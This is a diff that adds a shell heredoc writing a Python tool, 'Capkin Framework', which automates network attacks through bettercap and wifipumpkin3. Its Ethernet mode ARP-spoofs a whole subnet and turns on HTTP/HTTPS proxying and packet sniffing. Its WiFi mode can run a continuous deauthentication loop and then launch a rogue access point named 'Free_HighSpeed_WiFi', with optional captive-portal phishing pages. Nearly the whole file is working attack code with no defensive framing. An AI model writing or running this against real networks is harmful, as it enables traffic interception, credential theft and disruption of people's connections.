@@ -1,0 +1,109 @@
+cat << 'EOF' > ./capkin-code
+#!/usr/bin/env python3
+import os
+import sys
+import time
+import shutil
+import argparse
+import subprocess
+from threading import Thread
+
+class CapkinFramework:
+    def __init__(self):
+        self.args = self.parse_arguments()
+        self.bettercap_proc = None
+        self.wp3_proc = None
+        self.temp_caplet = "/tmp/capkin_bettercap.cap"
+        self.temp_pulp = "/tmp/capkin_wp3.pulp"
+
+    def parse_arguments(self):
+        parser = argparse.ArgumentParser(description="Capkin Framework")
+        parser.add_argument("-m", "--mode", choices=["eth", "wifi"], required=True)
+        parser.add_argument("-i", "--interface", required=True)
+        parser.add_argument("-s", "--ssid", default="Free_HighSpeed_WiFi")
+        parser.add_argument("-c", "--channel", default="6")
+        parser.add_argument("--captiveflask")
+        parser.add_argument("--deauth", action="store_true")
+        parser.add_argument("-t", "--target", default="192.168.1.0/24")
+        return parser.parse_args()
+
+    def verify_environment(self):
+        if os.getuid() != 0:
+            print("[-] Critical Error: This framework requires root privileges (sudo).")
+            sys.exit(1)
+
+    def write_bettercap_caplet(self, lines):
+        with open(self.temp_caplet, "w") as f:
+            f.write("\n".join(lines) + "\n")
+
+    def write_wp3_pulp(self, lines):
+        with open(self.temp_pulp, "w") as f:
+            f.write("\n".join(lines) + "\n")
+
+    def run_ethernet_mitm(self):
+        print(f"[*] Initializing Ethernet MITM on: {self.args.interface}")
+        caplet_config = [
+            "net.recon on",
+            "set arp.spoof.fullduplex true",
+            f"set arp.spoof.targets {self.args.target}",
+            "arp.spoof on",
+            "http.proxy on",
+            "https.proxy on",
+            "net.sniff on"
+        ]
+        self.write_bettercap_caplet(caplet_config)
+        cmd = f"bettercap -iface {self.args.interface} -caplet {self.temp_caplet}"
+        subprocess.run(cmd, shell=True)
+
+    def run_wireless_orchestration(self):
+        if self.args.deauth:
+            print(f"[*] Activating parallel background Bettercap deauth loop on {self.args.interface}...")
+            deauth_cmd = f"bettercap -iface {self.args.interface} -eval \"wifi.recon on; set ticker.period 4; set ticker.commands 'wifi.deauth'; ticker on\""
+            self.bettercap_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(2)
+
+        print("[*] Building custom Rogue Access Point configuration payload...")
+        pulp_config = [
+            f"set interface {self.args.interface}",
+            f"set ssid {self.args.ssid}",
+            f"set channel {self.args.channel}"
+        ]
+        if self.args.captiveflask:
+            pulp_config.append("set proxy captiveflask true")
+            pulp_config.append(f"set captiveflask.{self.args.captiveflask} true")
+        else:
+            pulp_config.append("set proxy noproxy true")
+        pulp_config.append("start")
+        self.write_wp3_pulp(pulp_config)
+
+        # Removed --no-gui to prevent option errors
+        wp3_cmd = f"wifipumpkin3 -pulp {self.temp_pulp}"
+        try:
+            print("[*] Launching operational Rogue Access Point deployment environment...")
+            subprocess.run(wp3_cmd, shell=True)
+        except KeyboardInterrupt:
+            pass
+
+    def cleanup(self):
+        print("\n[-] Cleaning up environments...")
+        if self.bettercap_proc:
+            self.bettercap_proc.terminate()
+        for temp_file in [self.temp_caplet, self.temp_pulp]:
+            if os.path.exists(temp_file):
+                try: os.remove(temp_file)
+                except: pass
+
+    def execute(self):
+        self.verify_environment()
+        try:
+            if self.args.mode == "eth":
+                self.run_ethernet_mitm()
+            elif self.args.mode == "wifi":
+                self.run_wireless_orchestration()
+        finally:
+            self.cleanup()
+
+if __name__ == "__main__":
+    app = CapkinFramework()
+    app.execute()
+EOF
